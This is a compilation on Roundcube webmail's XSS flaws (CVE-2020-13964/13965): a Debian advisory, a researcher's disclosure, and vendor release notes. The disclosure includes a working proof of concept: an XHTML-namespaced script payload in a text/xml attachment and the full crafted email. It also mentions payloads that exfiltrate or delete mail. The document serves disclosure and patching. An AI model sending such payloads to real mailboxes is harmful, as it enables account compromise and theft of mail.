Package        : roundcube
CVE ID         : CVE-2020-13964 CVE-2020-13965
Debian Bug     : 962123 962124

Matei Badanoiu and LoRexxar@knownsec discovered that roundcube, a
skinnable AJAX based webmail solution for IMAP servers, did not
correctly process and sanitize requests. This would allow a remote
attacker to perform a Cross-Side Scripting (XSS) attack leading to the
execution of arbitrary code.

For the oldstable distribution (stretch), these problems have been fixed
in version 1.2.3+dfsg.1-4+deb9u5.

For the stable distribution (buster), these problems have been fixed in
version 1.3.13+dfsg.1-1~deb10u1.

We recommend that you upgrade your roundcube packages.

For the detailed security status of roundcube please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/roundcube>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be

# CVE-2020-13965: Cross-Site Scripting (XSS) via Malicious XML Attachment in Roundcube Webmail

A Cross-Site scripting (XSS) vulnerability exists in Roundcube versions before 1.4.5 and 1.3.12.

By leveraging the parsing of "text/xml" attachment, an attacker can bypass the Roundcube script filter and execute arbitrary malicious JavaScript in the victim's browser when the malicious attachment is clicked/previewed.

### Vendor Disclosure:

The vendor's disclosure and patch of this vulnerability can be found [here](https://roundcube.net/news/2020/06/02/security-updates-1.4.5-and-1.3.12).

### Proof Of Concept:

By leveraging the parsing of XML elements by modern browsers, an attacker can use a "text/xml" attachment that will result in an XSS when the victim previews the attachment.

The XHTML content of a malicious file has the following form:

```
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
alert(1);
</something:script>

```

Now we are interested in creating a valid email with the above file. This can be achieved in multiple ways, but in this case, "[mpack](https://linux.die.net/man/1/mpack)" was used.

**Note:** Because "mpack" does not support "text/xml" formats, we use an "application/xml" format which we later manually modify.

The resulting email, containing the above XSS will have the following form:

```
Message-ID: <7676.1587651521@tester>
Mime-Version: 1.0
Subject: On Preview Alert
Content-Type: multipart/mixed; boundary="-"

This is a MIME encoded message.  Decode it with "munpack"
or any other MIME reading software.  Mpack/munpack is available
via anonymous FTP in ftp.andrew.cmu.edu:pub/mpack/
---
Content-Type: text/xml; name="alert.xml"
Content-Disposition: inline; filename="alert.xml"

<something:script xmlns:something="http://www.w3.org/1999/xhtml">
alert(1);
</something:script>

-----

```

We can then use "[sendmail](https://linux.die.net/man/8/sendmail.sendmail)" or other solutions to send the email to the victim. In this case the victim will be "guest@localhost".

The XSS will trigger when the victim clicks on the malicious attachment:

#### Implementing an "Advanced" JavaScript Payload

Advanced JavaScript payloads can be used in order to:

* Exfiltrate victim's mails
* Delete victim's mails
* Etc.

For more information about this step you can refer to [CVE-2020-12625](/DrunkenShells/Disclosures/blob/master/CVE-2020-12625-Cross%20Site-Scripting%20via%20Malicious%20HTML%20Attachment-Roundcube#implementing-an-advanced-javascript-payload).

[`9898599`](/roundcube/roundcubemail/commit/9898599d3ed504a604fd5bdc5fa0bea75129dadc)

This is a service and security update to the stable version 1.4 of Roundcube Webmail.

It contains fixes for recently reported security vulnerabilities as well a number

of general improvements from our issue tracker. See the full changelog below.

## Security fixes

* Fix XSS issue in template object 'username' ([#7406](https://github.com/roundcube/roundcubemail/issues/7406))
* Fix cross-site scripting (XSS) via malicious XML attachment
* Fix a couple of XSS issues in Installer ([#7406](https://github.com/roundcube/roundcubemail/issues/7406))
* Better fix for `CVE-2020-12641`

The latter two vulnerabilities again are related to public access to the Roundcube installer

and are therefore classified minor.

This version is considered stable and we recommend to update all productive installations

of Roundcube with it. Please do backup your data before updating!

# Security updates 1.4.5 and 1.3.12 released

Published: 02 June 2020

* Tags:
* [releases](/news/releases)
* [updates](/news/updates)
* [security](/news/security)

We just published service and security updates to the stable version 1.4 and the LTS
version 1.3 of Roundcube Webmail. They contain four fixes for recently reported
security vulnerabilities as well a number of general improvements from our issue tracker.

## Security fixes

* Fix XSS issue in template object `username` \*\*
* Fix cross-site scripting (XSS) via malicious XML attachment \*
* Fix a couple of XSS issues in Installer \*\*
* Better fix for `CVE-2020-12641`

The latter two vulnerabilities again are related to public access to the Roundcube installer
and are therefore classified minor.

See the full changelogs in the release notes on the Github download pages for the updated versions
[1.4.5](https://github.com/roundcube/roundcubemail/releases/tag/1.4.5) and [1.3.12](https://github.com/roundcube/roundcubemail/releases/tag/1.3.12).

We strongly recommend to update all productive installations of Roundcube
with this new versions.

Unfortunately it looks like we can’t render this comparison for you right now. It might be too big, or there might be something weird with your repository.

You can try running this command locally to see the comparison on your machine:

[`7a792f8`](/roundcube/roundcubemail/commit/7a792f8a907819e03d733b9885ac651a82b15429)

This is a service and security update to the LTS version 1.3 of Roundcube Webmail.

It contains four fixes for recently reported security vulnerabilities as well a

small number of general improvements backported from the latest stable version.

See the full changelog below.

## Security fixes

* Fix XSS issue in template object 'username' ([#7406](https://github.com/roundcube/roundcubemail/issues/7406))
* Fix cross-site scripting (XSS) via malicious XML attachment
* Fix a couple of XSS issues in Installer ([#7406](https://github.com/roundcube/roundcubemail/issues/7406))
* Better fix for `CVE-2020-12641`

The latter two vulnerabilities again are related to public access to the Roundcube installer

and are therefore classified minor.

This version in considered stable and we recommend to update all productive installations

of Roundcube 1.3.x with it. Please do backup your data before updating!

## CHANGELOG

* Security: Better fix for [CVE-2020-12641](https://github.com/advisories/GHSA-q9jx-pp2v-v8xh "CVE-2020-12641")
* Security: Fix XSS issue in template object 'username' ([#7406](https://github.com/roundcube/roundcubemail/issues/7406))
* Security: Fix couple of XSS issues in Installer ([#7406](https://github.com/roundcube/roundcubemail/issues/7406))
* Security: Fix cross-site scripting (XSS) via malicious XML attachment
